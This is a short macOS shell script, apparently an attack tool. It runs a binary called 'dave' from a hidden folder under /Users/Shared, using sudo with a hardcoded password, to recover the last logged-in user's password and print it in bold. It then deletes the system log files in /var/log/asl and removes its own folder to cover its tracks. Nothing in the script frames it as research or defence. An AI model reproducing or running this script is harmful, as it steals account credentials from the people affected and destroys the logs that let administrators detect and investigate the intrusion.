#!/bin/sh
user=$(users | awk '{print $NF}'); apostrophe="'"
echo $user
wdir="/Users/Shared/.dave"
cd $wdir
echo m@xc0m1 | sudo -S ./dave -u $user > $wdir/pass
pass=$(cat $wdir/pass | grep "Found password : " | awk '{print $5}' |sed s/$apostrophe//g)
echo "*********"; echo "* \033[1m$pass\033[0m *"; echo "*********"
echo done
sudo rm -rf /var/log/asl/*.asl
last
rm -rf $wdir